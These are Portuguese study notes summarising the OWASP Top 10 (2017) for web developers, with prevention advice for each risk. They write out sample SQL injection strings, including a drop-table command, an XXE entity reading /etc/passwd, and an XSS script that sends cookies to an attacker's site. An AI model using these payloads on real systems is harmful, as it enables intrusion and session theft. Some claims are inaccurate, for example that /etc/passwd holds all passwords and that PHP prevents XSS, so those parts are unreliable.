# OWASP TOP 10 2017

## A1 - Injection
Como funciona: 

Imagina que em uma aplicação web, na página de Login, o Front-End fornece o email e senha que o usuário digitou para o Back-End, que irá montar a query e executar no banco de dados
então imagine que a query que o backend monta é essa:

  
    var email = request.getParameter('email')
    var senha = request.getParameter('senha')
    var sql = 'select * from Users where email = '" + email + "' and senha = '" + senha + "';
  
se o usuário digitar o seguinte comando no campo de email:

    ' or admin=true#

e qualquer coisa no campo senha, a query ficará assim: 

    'select * from Users where email = '' or admin=true#'and senha = '263721638712'

e conseguirá entrar no site pois a query retorna um usuário admin, isso é um SQL injection

chutando que o banco de dados, na tabela user tenha um campo booleano chamado admin

outro comando que poderia ser inputado é: 

    '; drop table Usuarios;#

mas esse problema nao é só em SQL, no NoSQL tambem, no terminal bash e qualquer serviço que o cliente passa informação e será executado em algum lugar

em NoSQL tem exemplo de injection nesse link: https://mongoplayground.net/p/Nq_-Ghhq9rW

## Como se prevenir: 

Sanitizar os dads, mas não criar sua própria sanitização e nunca concatenar strings na unha! Existem ferramentas já prontas que fazem a sanitização do comando SQL antes de rodar, em Java por exemplo:

    String comando = "select * from clientes where id = ?";
    PreparedStatement p = conn.prepareStatement(comando);
    p.setString(1, cliente.getId())

o PreparedStatement é API que vai sanitizar e impedir um SQL injection

outra forma de se prevenir é migrar para um ORM, o Hibernet tem vulnerabilidade a SQL injection se você fizer na unha a concatenação de string, mas na própria documentação mostra forma de sanitizar o comando

## A2 - Broken Authenticator
esse tipo de ataque mostra algumas vulnerabilidades, por exemplo:

  - se sua aplicação aceita senhas muito fáceis
      significa q alguem pode descobrir e invadir a aplicação
      no momento q vc aceita senhas comuns, usuarios vao usar senhas comuns e vc tem 1 vulnerabilidade, e sim, teoricamente nao eh culpa da aplicação, mas se quer tapar o maximo de buracos possiveis, entao nao deixe q ele crie senha facil

  - se sua aplicação permite ataque brute force

  - salvar senha em texto puro no banco (veja A3)

  - nao ter autenticacao multifatores

  - expor ID's de sessao na URL
      imagina q na sua aplicacao tem uma URL assim: 

        app.com/home?sessionid=7389784973298742913

      esse parametro pode estar visivel em servicos de logs
      e essa sessao identifica um usuario, entao se alguem pega essa URI e acessar, vai estar acessando como aquele usuario...
      
  - se a app nao gera um sessionID novo depois do login com sucesso

  - se a app nao invalidar a sessionID depois do usuario fazer logout

  - se a app nao tem timeout de sessionID
     
    OBS: antigamente era considerado uma boa pratica fazer o usuario trocar de senha de X em X tempo, mas hoje em dia não é mais recomendado, pois isso encorajava os usuários a utilizar senhas fracas, e reutilizar senhas, inves disso, utilize multifactor authenticator

## Como se prevenir: 
  - implementar multifactor
    só isso ja inviabiliza as 3 primeiras vulnerabilidades, pois podem ate saber a senha, mas o codigo de autenticacao eh bem dificil

  - nunca utilizar usuario e senha padrao nos serviços, seja de banco de dados, fila, qualquer serviço da aplicação, como admin/admin por exemplo.

  - implementar check se a senha é facil e apenas deixar cadastrar senhas fortes

  - evitar dizer na mensagem "este usuario nao existe", pois isso é uma informação a mais para o hacker... ou "senha incorreta", o certo eh dizer "usuario e senha invalidos", e tomar cuidado tambem com a parte de recuperacao de senha, la tambem pode descobrir se o usuario existe na plataforma

  - diminuir o limite de logins falhos, e se vc ver q alguem tentou logar 3 milhoes de vezes com o mesmo usuario, bloqueia esse IP!

  - logar na aplicação sempre que alguém tentar se logar como administrador, eh importante saber que alguem tentou se logar como administrador!

  - nao ter sessionID na url, gerar novo sessionID após login com sucesso, ter timeout para o sessionID e devem ser invalidados no servidor tambem, nos momentos adequados

## A3 - Sensitive Data Exposure (exposicao de dados sensiveis)
  - senhas nao encriptadas gravadas no banco

  - no formulario de login nao ter HTTPS (o ideal eh q tenha HTTPS na app inteira)
    pois entre o servidor web e o servidor backend, tem a rede, que vai enviar esses dados e eles precisam estar criptografados (https)
    se nao, esta vulneravel a ataques "man in the middle", a pessoa fica no meio, nos intermediarios, onde a rede envia dados, pra tentar pegar algo

  - nao seguir LGPD

  - senhas nao encriptadas armazenadas em backups etc

  - usar algoritmos de criptografia fracos, que ja foram quebrados

  - conseguir acessar o site com http, o certo é redirecionar para o https

  - nao ter garantia de certificado
    
    OBS: outra coisa q devemos fazer tambem eh criptografar numero de cartao de credito com algoritmo q consegue descriptografar
    mas nao usar o recurso automatico de criptografia do banco de dados, pois se nao abre brecha para SQL injection
    criptografar e descriptografar no backend!

## Como se prevenir: 
(algumas vulnerabilidades acima ja sao auto explicativas de como prevenir):
  - usar algoritmos de encriptacao atualizados e fortes (scrypt, argon2, bcrypt, PBKDF2)

  - desabilitar cache para requests que possuem dados sensiveis

  - nao armazenar dados desnecessario 
    se vc só precisa da informacao em um momento, nao armazena
    as vezes o provedor de pagamentos da um token pro cartao de credito, ai guarda o token no banco
    o numero do cartao vc nao vai usar de novo

## A4 - XML External Entities (XEE)
a entidade externa permite que um parser de xml carregue informacoes de um lugar de fora, inclusive do sistema operacional do servidor, entao imagine que sua aplicação recebe um XML similar a isso:

    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE contato....>
        <!ENTITY nomecliente SYSTEM "Arthur">
    <cliente>
        <nome>&nomecliente;</nome>
    <cliente>

essa é uma entidade declarada no proprio xml, entao se inves de "Arthur", alguem enviar no xml nomecliente com valor:

    "file:///etc/passwd"

o parser de XML vai ler a entidade externa, vai pegar o conteudo desse arquivo e colocar dentro do campo <nome>
ou seja, todas as senhas do servidor estarao gravas no campo nome

## Como se prevenir: 
  - desativar xml external entity e DTD processing em todos os xmls parsers da aplicação: https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html

  - usar SAST para detectar esses ataques

  - se nao for possivel fazer esses passos acima, use um api security gateway ou WAFs

## A5 - Broken Access Control
essa vulnerabilidade é basicamente controle de permissoes 
  - áreas logadas
    não deixar qualquer um acessar pela URL paginas que só deveriam ser acessadas pelo usuario logado, validar permissao de acesso com perfil

  - má configurações de CORS
    permitindo que pessoas indevidas acessem a API q nao deveria
    
## Como se prevenir: 
  - controle de area logada

  - com excecao de recursos publicos, tudo fechado por padrao

  - liberar CORS só para o necessario

  - token JWT deve ser invalidado depois que usuario fez logout

  - desabilitar web server directory listing

  - time de QA e devs incluirem testes de controle de acesso de unidade e integração

    OBS: SAST e DAST podem perceber a ausencia desse controle, mas nao validam se esta funcionando

## A6 - Security misconfiguration
as vulnerabilidades sao:
  - recursos desnecessarios instalados (portas, programas, servicos, paginas, privilegios)

  - usuario com senha padrao admin/admin (veja A2)

  - mostrar stack trace em erros para usuario, mostrando nomes de classes, parametros, metodos

  - directory listing nao esta desabilitado no servidor

  - software esta desatualizado ou vulneravel (veja A9)

## Como se prevenir: 
  - ter um ambiente igual producao para testar falhas de segurança

  - apenas recursos necessarios instalados no servidor

  - verificar as permissoes dos serviços de storage de cloud (S3, cloud storage, blob storage)

## A7 - Cross-Site Scripting (XSS)
qualquer site, serviço ou sistema q interpreta/executa/invoca/carrega/ codigo dinamico, esta suscetível a esse tipo de ataque

basicamente nos campos de input de html, o atacante irá escrever tag como ``<script>`` **e colocar codigo JS aqui** ``</script>``
ele pode injetar codigo js no html, como 

    <script>document.location=site-do-atacante?foo=document.coockie</script>
  
  dessa forma pegando os coockies de todos os usuários, pegando sessions de logins etc

## Como se prevenir: 
  - use tecnologias q previnem esse ataque, como ruby on rails, react, asp .net, JSP, php

  - habilitar CSP

## A8 - Insecure Deserialization

Deserialization é o processo de converser ``JSON``/``XML`` em um objeto do meu sistema
é basicamente injection por meio de ``JSON``/``XML``, injection de codigo q executa algo, e no momento da deserialization, muda o comportamento da aplicação
adulterando dados, modificando informacoes no xml pra salvar no banco de uma forma que nao deveria

## Como se prevenir: 
  - nao aceitar objetos serializados de fontes q vc nao confia

  - implementando checagem de integridade dos dados

  - isolar e rodar codigo de deserialization em ambientes com baixo privilegio quando possivel

  - logar todas as falhas e exceptions de deserialization, pois pode ser um ataque

  - restringir e monitorar dados entrando e saindo dos servidores q deserializam
    pra poder ver, se processo de deserialization que antes devolvia 4 bytes, agr ta retornando 1MB, tem algo de estranho!

## A9 - Using Components with Known Vulnerabilities 
  - se vc nao sabe as versoes de todos componentes que vc usa, tanto no front quanto no back

  - se a tecnologia q vc usa tem vulnerabilidade, sem suporte, ou desatualizado, abandonado (OS/web/application server/database)

  - se vc nao faz scan do software, para ver se há vulnerabilidades, e nao tem relatorios de segurança sobre os componentes que vc usa

  - se vc nao atualiza os frameworks, linguagens e dependencias que utiliza baseado em riscos

  - configurações mal feitas de segurança (veja A6)
  
## Como se prevenir: 
  - remover dependencias desnecessarias, documentos, arquivos, componentes desnecessarios 

  - monitorar continuamente serviços como CVE e NVD para saber sobre vulnerabilidades, se inscreva em alertas de email sobre segurança 

  - utilize somente componentes de fontes oficiais em links seguros

## A10 - Insuficient logging and monitoring
  - se sua aplicação nao tem logging de logins, falha de logins, todo tipo de atividade de alto valor

  - logs das aplicações nao sao monitoradas para atividades suspeitas

  - logs estao sendo logados apenas no console do servidor

  - nao tem alerta nos logs 

  - testes de penetração e serviços de scan como DAST nao disparam alertas

## Como se prevenir: 
  - logar tentativas falhas de login e todo tipo de atividade de alto valor (veja A2 e A8)

  - utilizar ferramenta de monitoramento

  - utilizar algum serviço de log para as infos nao serem logadas apenas no servidor

  - definir valores de alerta nos logs para vc ficar sabendo

  - disparar alertas quando testes de penetraçao e scan DAST falharem
